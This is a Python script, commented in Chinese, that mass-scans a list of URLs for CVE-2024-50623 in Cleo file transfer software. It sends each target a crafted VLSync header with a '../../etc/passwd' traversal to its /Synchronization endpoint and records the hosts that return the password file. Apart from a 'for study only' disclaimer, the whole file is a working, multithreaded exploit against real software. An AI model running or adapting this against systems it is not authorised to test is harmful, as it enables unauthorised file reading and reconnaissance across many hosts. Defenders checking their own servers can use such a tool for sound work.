# _*_ coding : utf-8 _*_
# @Time : 2025-03-14 9:20
# Author : 长安风生
# File : Cleo_read
# Project : pythonProject
import requests
import sys
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning

# 禁止显示与不安全请求相关的警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# 获取当前脚本绝对路径
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
# 构建完整文件路径
INPUT_FILE = os.path.join(SCRIPT_DIR, "../check/Cleo_read_check.txt")
OUTPUT_FILE = os.path.join(SCRIPT_DIR, "../result/Cleo_read.txt")

#检测前描述
def print_logo():
    logo = """
             .__                                           _____                           .__                           
  ____ |  |__ _____    ____    _________    ____   _/ ____\____   ____    ____  _____|  |__   ____   ____    ____  
_/ ___\|  |  \\__  \  /    \  / ___\__  \  /    \  \   __\/ __ \ /    \  / ___\/  ___/  |  \_/ __ \ /    \  / ___\ 
\  \___|   Y  \/ __ \|   |  \/ /_/  > __ \|   |  \  |  | \  ___/|   |  \/ /_/  >___ \|   Y  \  ___/|   |  \/ /_/  >
 \___  >___|  (____  /___|  /\___  (____  /___|  /  |__|  \___  >___|  /\___  /____  >___|  /\___  >___|  /\___  / 
     \/     \/     \/     \//_____/     \/     \/             \/     \//_____/     \/     \/     \/     \//_____/
    """
    print(logo)

def print_usage():
    print("使用说明：")
    print("    1.在check文件下创建Cleo_read_check.txt把要检测的url放入Cleo_read_check.txt")
    print("    2.输入路径并执行")
    print()
    print("结果说明：")
    print("    成功检测出的url会保存到Cleo_read.txt")
    print()

def start_message():
    print("本程序仅供学习使用，如若非法他用，与本文作者无关，需自行负责！")
    print("程序功能：多线测检测Cleo文件传输软件任意文件读取漏洞(CVE-2024-50623）   By:长安风生&棉花糖网络安全")
    print("-" * 88)  # 打印分割线

def print_red(text):
    # ANSI转义序列设置为红色，让存在的漏洞的变成红色醒目
    red_start = "\033[91m"
    red_end = "\033[0m"
    print(red_start + text + red_end)

def check_vulnerability(target_url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Vlsync': ('Retrieve;l=Ab1234-RQ0258;n=VLTrader;v=7.2.1;a=1337;po=1337;'
                   's=True;b=False;pp=1337;path=../../etc/passwd'),
        'Accept-Encoding': 'gzip, deflate, br'
    }

    try:
        response = requests.get(target_url, headers=headers, timeout=15, verify=False)
        if "root:x:" in response.text:
            # print(response.text)
            print_red(f"[+] The target {target_url} is potentially vulnerable to arbitrary file read.")
            return target_url
        else:
            print(f"[-] The target {target_url} does not appear to be vulnerable to arbitrary file read.")
    except requests.RequestException as e:
        print(f"[!] Failed to connect to {target_url}: {e}")
    return None

def process_url(line):
    base_url = line.strip()
    target_url = base_url + '/Synchronization'
    return check_vulnerability(target_url)

if __name__ == "__main__":
    print_logo()
    print_usage()
    start_message()
    # 询问是否想要执行检测
    print("您希望现在执行脚本吗？(yes/no):")
    execute_check = input().strip().lower()
    if execute_check not in ["yes", "y"]:
        print("执行已取消!")
        sys.exit(0)

    vulnerable_urls = []  # 用于存储检查成功的URL

    with open(INPUT_FILE, 'r') as file:
        urls = [line.strip() for line in file]

    with ThreadPoolExecutor(max_workers=100) as executor:
        # 使用future对象来获取线程执行的结果
        future_to_url = {executor.submit(process_url, url): url for url in urls}
        for future in as_completed(future_to_url):
            result = future.result()
            if result:
                vulnerable_urls.append(result)

    # 执行结束后，将所有检测成功的URL写入Cleo_read.txt
    with open(OUTPUT_FILE, 'w', encoding='utf-8') as  file:
        for url in vulnerable_urls:
            file.write(url + '\n')
    print("CVE-2024-50623漏洞检查完成")
    #print("CVE-2024-50623漏洞检查完成！！！！")